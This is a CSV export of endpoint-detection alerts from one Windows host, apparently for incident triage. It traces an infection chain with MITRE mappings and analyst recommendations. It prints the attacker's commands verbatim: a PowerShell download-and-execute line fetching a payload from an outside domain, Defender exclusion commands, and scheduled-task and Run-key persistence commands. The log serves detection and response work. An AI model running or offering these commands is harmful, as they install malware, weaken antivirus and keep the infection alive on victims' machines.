Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:23:53.265",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"22,348",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-2F2CDD05
"Jun 1, 2026 @ 14:23:53.261",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"9,916",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-AC78AF4A
"Jun 1, 2026 @ 14:24:52.508",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child,100,EDR/AV rule fired: wscript.exe ; LOLBin executed: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost.exe launching a script interpreter,-,-,-,-,-,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-CE80C87B
"Jun 1, 2026 @ 14:24:52.510",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child,100,EDR/AV rule fired: wscript.exe ; LOLBin executed: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost.exe launching a script interpreter,-,-,-,-,-,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9C84DAE0
"Jun 1, 2026 @ 14:24:52.513",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child,100,EDR/AV rule fired: wscript.exe ; LOLBin executed: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost.exe launching a script interpreter,-,-,-,-,-,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-6E3AF984
"Jun 1, 2026 @ 14:24:52.516",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,EDR/AV rule fired: uusd.exe ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Abnormally high distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-4D937D62
"Jun 1, 2026 @ 14:23:04.853",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-DB909745
"Jun 1, 2026 @ 14:23:04.854",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-971A881F
"Jun 1, 2026 @ 14:23:04.855",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E91DD816
"Jun 1, 2026 @ 14:23:04.856",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-688556DD
"Jun 1, 2026 @ 14:23:04.857",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-2B9908F6
"Jun 1, 2026 @ 14:23:04.838",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-EE9AA75B
"Jun 1, 2026 @ 14:23:04.840",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-69E8DF1E
"Jun 1, 2026 @ 14:23:04.841",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js,-,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E87EB71B
"Jun 1, 2026 @ 14:23:01.254",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,-,-,modification,"22,348",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-5581FD2F
"Jun 1, 2026 @ 14:23:27.243",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002w.txt,-,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-A4A276DD
"Jun 1, 2026 @ 14:23:27.244",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_d.js,-,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-1F43A822
"Jun 1, 2026 @ 14:23:27.266",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140_1.dll,-,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7113A835
"Jun 1, 2026 @ 14:23:27.267",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_ctypes.pyd,-,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-385F9347
"Jun 1, 2026 @ 14:23:27.268",C:\Users\DELL\office_portable_x3.exe,-,-,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_socket.pyd,-,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-CBB520BF
"Jun 1, 2026 @ 14:24:04.296",C:\Users\Public\Pictures\kelotopu\uusd.exe,-,-,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Abnormally high distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,-,-,-,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-D059498A
"Jun 1, 2026 @ 14:24:04.329",C:\Users\Public\Pictures\kelotopu\uusd.exe,-,-,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Abnormally high distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,-,-,-,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E5210C99
"Jun 1, 2026 @ 14:24:03.128",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child,100,EDR/AV rule fired: wscript.exe ; LOLBin executed: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost.exe launching a script interpreter,-,-,-,-,-,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5912DCB3
"Jun 1, 2026 @ 14:24:03.693",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,EDR/AV rule fired: uusd.exe ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; Abnormally high distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-97AB148B
"Jun 1, 2026 @ 14:22:58.483",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""",Download Execute | LOLBin Abuse | PowerShell Payload | Rare Parent-Child | Sigma Match,100,Rare parent-child pair: powershell.exe->powershell.exe ; LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Download-then-execute pattern detected,-,-,-,-,-,end,"1,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Isolate host; retrieve and sandbox the downloaded payload,AH-6040AB77
"Jun 1, 2026 @ 14:23:22.978",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare parent-child pair: office_portable_x3.exe->schtasks.exe ; LOLBin executed: schtasks.exe ; Persistence command detected: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,-,-,-,-,-,start,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-04012947
"Jun 1, 2026 @ 14:23:23.205",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare parent-child pair: office_portable_x3.exe->schtasks.exe ; LOLBin executed: schtasks.exe ; Persistence command detected: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,-,-,-,-,-,end,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-D1899406
"Jun 1, 2026 @ 14:23:14.385",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E7A7DB6A
"Jun 1, 2026 @ 14:23:12.163",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E10068CA
"Jun 1, 2026 @ 14:23:12.166",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-F669406F
"Jun 1, 2026 @ 14:23:12.144",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-65B8243B
"Jun 1, 2026 @ 14:23:13.405",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-58D05900
"Jun 1, 2026 @ 14:23:13.334",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-85F7557A
"Jun 1, 2026 @ 14:23:13.336",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-57518A36
"Jun 1, 2026 @ 14:23:13.317",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-4791C22C
"Jun 1, 2026 @ 14:23:14.403",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,end,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0F8E9D79
"Jun 1, 2026 @ 14:23:10.672",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0ADA40AD
"Jun 1, 2026 @ 14:23:12.231",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-3D080498
"Jun 1, 2026 @ 14:23:10.561",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match,100,LOLBin executed: cmd.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line ; PowerShell adding a Defender exclusion,-,-,-,-,-,start,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BF3B4EF1
"Jun 1, 2026 @ 14:23:53.306",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match,100,EDR/AV rule fired: powershell.exe ; LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line,-,-,-,-,-,rule_detection,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-238B5D2D
"Jun 1, 2026 @ 14:23:53.303",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match,100,EDR/AV rule fired: powershell.exe ; LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line,-,-,-,-,-,rule_detection,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-D279226A
"Jun 1, 2026 @ 14:23:53.301",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match,100,EDR/AV rule fired: powershell.exe ; LOLBin executed: powershell.exe ; Suspicious PowerShell keyword detected ; Defense evasion keyword in command line,-,-,-,-,-,rule_detection,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-A0823433
"Jun 1, 2026 @ 14:23:53.298",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5700B394
"Jun 1, 2026 @ 14:23:53.295",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-C18C29B9
"Jun 1, 2026 @ 14:23:05.070",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-DB2DFE4D
"Jun 1, 2026 @ 14:23:04.642",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,EDR/AV rule fired: office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,-,-,-,-,-,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-04C7009A
"Jun 1, 2026 @ 14:24:52.501",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",EDR Rule Detection | LOLBin Abuse | Persistence | Sigma Match,100,EDR/AV rule fired: reg.exe ; LOLBin executed: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo ; reg.exe adding a Run key entry,-,-,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,-,-,rule_detection,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9168EEB0
